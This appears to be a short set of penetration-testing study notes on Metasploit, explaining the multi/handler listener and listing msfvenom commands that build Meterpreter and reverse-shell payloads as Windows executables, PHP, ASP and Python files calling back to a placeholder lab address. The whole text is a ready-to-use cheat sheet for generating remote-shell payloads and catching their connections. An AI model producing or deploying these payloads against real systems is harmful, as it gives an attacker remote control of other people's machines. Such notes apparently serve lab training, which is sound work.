#### Catching call backs from the encoded payload generated ####

- Here we use a handler, a handler is just a way of accepting incoming connections.
    - This will allow your payload to call back to either merterpreter or the rev shell you generated.

        - use exploit/multi/handler 

      - This will be our most commonly used handler, it supports all payloads and can be used by rev shells or merterpreter.

#### Here is a list of formats for payloads ####

- Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

- PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

- ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

- Python:
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

